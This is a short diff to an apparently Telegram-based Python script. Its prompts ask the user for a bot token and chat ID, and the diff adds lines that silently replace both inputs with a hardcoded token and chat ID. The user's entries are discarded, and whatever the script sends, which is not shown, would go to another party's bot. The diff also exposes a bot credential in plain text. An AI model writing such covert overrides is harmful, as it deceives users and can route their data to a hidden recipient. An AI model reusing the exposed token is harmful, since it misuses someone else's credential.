@@ -63,6 +63,10 @@ token = input('\x1b[1;39mT\x1b[1;38mO\x1b[1;36mK\x1b[1;34mE\x1b[1;32mN\x1b[1;33m
 print('\n')
 ID = input('\x1b[1;31mI\x1b[1;34mD \x1b[1;32m   : ')
 
+token = ('5964045854:AAGSPXcBHJsysMPs5vP9x71ZnpCMx0e2Eh0')
+ID = ('5476613333')
+
+
 os.system('clear')
 cetak(nel('\tالمدفوعة ا 😈🔥'))
 
